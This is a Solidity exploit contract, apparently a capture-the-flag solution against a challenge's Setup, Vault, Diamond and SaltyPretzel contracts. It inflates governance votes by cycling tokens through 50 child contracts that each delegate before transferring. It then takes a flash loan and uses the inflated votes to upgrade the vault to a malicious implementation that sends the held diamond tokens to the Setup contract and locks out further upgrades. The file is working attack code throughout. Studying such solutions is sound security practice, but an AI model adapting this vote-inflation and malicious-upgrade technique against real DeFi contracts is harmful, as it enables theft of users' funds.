// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "./Setup.sol";
import "./VaultFactory.sol";
import "./Vault.sol";
import "./Diamond.sol";
import "./SaltyPretzel.sol";
import "./openzeppelin-contracts/interfaces/IERC20.sol";

//import "hardhat/console.sol";

contract Exploit {

    Setup public setup;
    SaltyPretzel public saltyPretzel;

    Child[] children;
    NewVault newVault;

    constructor (address _setup) {
        setup = Setup(_setup);

        newVault = new NewVault();

        saltyPretzel = setup.saltyPretzel();

    }

    function addChildren() external {
        for (uint i = 0; i < 50; i++) {
            children.push(new Child(address(saltyPretzel)));
        }
    }

    function exploit() external {
        setup.claim();

        for (uint i = 0; i < 50; i++) {
            children.push(new Child(address(saltyPretzel)));
        }

        for (uint i = 0; i < children.length; i++) {
            saltyPretzel.transfer(address(children[i]), saltyPretzel.balanceOf(address(this)));
            children[i].delegateThenTransferAll(address(this));
        }

        //console.log(saltyPretzel.getCurrentVotes(address(this)));
        require(saltyPretzel.getCurrentVotes(address(this)) >= 10_000 ether, "balance didn't increase enough");
    }

    function exploit2() external {
        Vault vault = setup.vault();
        Diamond diamond = setup.diamond();
        vault.flashloan(address(diamond), diamond.balanceOf(address(vault)), address(this));
        NewVault(address(vault)).giveDiamonds(address(diamond), address(setup));
        require(setup.isSolved(), "!solved");
    }

    function onFlashLoan(
        address initiator,
        address token,
        uint256 amount,
        uint256 fee,
        bytes calldata data
    ) external returns (bytes32) {
        //console.log("before:", IERC20(token).balanceOf(address(this)));

        Vault vault = setup.vault();
        vault.governanceCall(
            abi.encodeWithSignature(
                "upgradeTo(address)",
                address(newVault)
            )
        );
       //vault._testUpgradeTo(address(newVault));

        //console.log("after:", IERC20(token).balanceOf(address(this)));
        IERC20(token).transfer(msg.sender, amount);
        return keccak256("ERC3156FlashBorrower.onFlashLoan");
    }
}

contract Child {
    SaltyPretzel public saltyPretzel;

    constructor (address _saltyPretzel) {
        saltyPretzel = SaltyPretzel(_saltyPretzel);
    }

    function delegateThenTransferAll(address to) public {
        saltyPretzel.delegate(to);
        saltyPretzel.transfer(to, saltyPretzel.balanceOf(address(this)));
    }
}

contract NewVault is Initializable, UUPSUpgradeable, OwnableUpgradeable {
    function giveDiamonds(address token, address to) external {
        IERC20(token).transfer(to, IERC20(token).balanceOf(address(this)));
    }

    function _authorizeUpgrade(address) internal override view {revert();}
}
